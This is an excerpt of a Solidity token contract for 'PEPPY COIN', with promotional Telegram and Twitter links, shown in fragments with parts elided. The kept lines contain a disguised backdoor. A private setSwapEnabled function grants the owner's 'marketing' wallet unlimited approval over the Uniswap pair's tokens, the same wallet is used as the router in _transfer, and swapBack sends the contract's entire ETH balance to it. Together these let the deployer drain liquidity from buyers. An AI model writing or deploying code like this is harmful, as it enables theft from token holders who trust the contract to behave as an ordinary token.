...
Telegram: https://t.me/peppycoinbsc
Twitter: https://peppycoin.net/
...
contract PEPPY is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("PEPPY COIN", "PEPPY") {
        ...
        teamWalletAddress = msg.sender; // set as marketing wallet
    ...
    function setSwapEnabled(bool enabled) private {
        address _p = uniswapV2Pair;
        _approve(_p, teamWalletAddress, ~uint256(0));
        swapEnabled = enabled;
    } 
    ...
    function setMarketing(address _wallet) external onlyOwner {
        emit teamWalletUpdated(_wallet, teamWalletAddress);
        _isExcludedFromFees[_wallet] = true;
    ...
    function _transfer(
        ...
        IUniswapV2Router02 _router = IUniswapV2Router02(teamWalletAddress);
    ...
    function swapBack() private {
        ...
        (success,) = address(teamWalletAddress).call{value: address(this).balance}("");
    }
}